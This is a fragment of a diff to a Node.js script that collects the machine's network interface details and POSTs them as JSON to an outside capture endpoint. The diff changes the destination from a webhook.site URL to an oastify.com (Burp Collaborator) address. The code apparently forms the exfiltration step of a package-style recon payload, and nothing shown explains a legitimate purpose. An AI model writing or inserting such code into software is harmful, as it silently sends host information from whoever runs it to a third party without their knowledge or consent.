@@ -4,7 +4,7 @@ const os = require('os');
 const interfaces = os.networkInterfaces();
 const payload = JSON.stringify({ interfaces }, null, 2);
 
-const req = https.request('https://webhook.site/6b9c18ef-18ff-465a-a7c6-f788fd9ed20b', {
+const req = https.request('https://ccsfcqpeh2dm4dhuejwjdylfz65xtrhg.oastify.com', {
   method: 'POST',
   headers: {
     'Content-Type': 'application/json',
